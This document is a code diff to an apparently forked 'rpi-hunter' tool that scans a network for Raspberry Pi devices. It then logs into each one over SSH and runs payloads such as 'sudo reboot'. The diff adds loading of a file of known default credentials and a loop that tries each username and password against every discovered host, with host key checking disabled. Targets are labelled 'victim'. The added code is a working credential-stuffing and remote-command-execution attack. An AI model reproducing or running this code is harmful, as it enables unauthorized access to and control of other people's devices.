@@ -2,9 +2,15 @@
 # -*- coding: utf-8 -*-
 ### ORIGINAL CODE BY BUSESCANFLY, MODIFIED BY TEAM ###
 import os
-import argparse
+import subprocess
 from termcolor import colored, cprint
 import os
+
+main_directory = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
+credentials_file = os.path.join(main_directory, "known_credentials", "pi")
+with open(credentials_file, "r") as file:
+	credentials = [line.strip().split(':') for line in file]
+	user_password_list = [(user, password) for user, password in credentials]
 
 payloads={
 	'reboot': 'sudo reboot',
@@ -36,7 +42,7 @@ def scan():
 
 # Send payload to Pi's.
 # Requires a list of IP's, a username, credentials (password), and the payload.
-def rpi(ip_list, user, creds, payload):
+def rpi(ip_list, credentials_list, payload):
 	cprint(f"Loaded {str(len(ip_list))} IP(s)", "yellow")
 
 	cprint(f"Loaded payload: {payload}", "green")
@@ -44,20 +50,18 @@ def rpi(ip_list, user, creds, payload):
 
 	for ip in ip_list:
 		print(f"{colored('Sending payload to victim', 'yellow')} {colored(ip, 'red')}")
-		print("\n")
-		print(f"Output from {ip}:")
-		os.system(f"sshpass -p \"{creds}\" ssh -o stricthostkeychecking=no {user}@{ip} {payload}")
-		print("\n")
-
-# Prints the introduction message, originally inserted BusesCanFly.
-# Kept (but updated) for the their sake!
-def intro():
-	print('\n')
-	cprint("                        NETWORK BUSTER 'N' RPI-HUNTER                        ", "red")
-	cprint("-----------------------------------------------------------------------------", "yellow")
-	cprint("            Originally by BusesCanFly, Forked & Modified by Team             ", "blue")
-	cprint("-----------------------------------------------------------------------------", "yellow")
-	print('\n')
+		print("")
+		for user, creds in credentials_list:
+			print(f"Attempting to send payload using username {user} and password {creds}...")
+			try:
+				ssh_command = f"sshpass -p \"{creds}\" ssh -o stricthostkeychecking=no {user}@{ip} {payload}"
+				output = subprocess.check_output(ssh_command, shell=True, text=True)
+				print(colored(f"Success! Output from {ip}:", "green"))
+				print(output)
+			except subprocess.CalledProcessError as e:
+				print(colored(f"Failed to send payload to {ip} using username {user} and password {creds}.", "red"))
+				print(colored(f"Error: {e}", "red"))
+			print("")
 
 # Main function for rpi-hunter.
 # If args.list is True, it will list available payloads.
@@ -68,12 +72,10 @@ def let_the_hunt_begin(args):
 		payload=payloads[args.payload]
 	else:
 		payload=args.payload
-  
-	[user, creds] = [args.user, args.creds]
-    
-	intro()
 
 	if args.list:
 		list_payloads()
 	else:
-		rpi(scan(), user, creds, payload)
+		print("")
+		print(colored("Beginning network scan...", "blue"))
+		rpi(scan(), user_password_list, payload)
